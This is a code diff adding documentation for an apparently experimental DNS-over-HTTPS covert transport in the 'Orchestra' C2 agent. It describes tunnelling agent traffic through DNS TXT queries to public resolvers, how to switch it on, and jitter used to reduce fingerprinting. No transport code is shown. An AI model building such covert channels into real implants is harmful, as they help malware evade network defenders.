@@ -1,3 +1,26 @@
+//! DNS-over-HTTPS (DoH) covert transport for the Orchestra agent.
+//!
+//! # Status: EXPERIMENTAL — not wired into the default startup path
+//!
+//! This module implements a `Transport` that tunnels agent messages inside DNS
+//! TXT queries sent to a DoH resolver (Cloudflare, Google, etc.).  The C2
+//! server must run a corresponding DoH-aware listener to decode the TXT
+//! payload.
+//!
+//! ## How to enable
+//!
+//! 1. Set `dns_over_https = true` and optionally `cdn_relay` in `agent.toml`.
+//! 2. In `agent/src/lib.rs` `Agent::new()`, replace the default TLS transport
+//!    with `c2_doh::DohTransport::new(&profile, &sleep_cfg, session).await?`.
+//!
+//! ## Limitations
+//!
+//! * Maximum payload per DNS TXT record is ~255 bytes; large messages are
+//!   automatically fragmented and reassembled.
+//! * DoH resolvers may rate-limit or cache queries; jitter from `SleepConfig`
+//!   is applied between fragments to reduce fingerprinting.
+//! * Server-side DoH listener is **not** included in this release.
+
 use anyhow::{anyhow, Result};
 use async_trait::async_trait;
 use common::config::{MalleableProfile, SleepConfig};
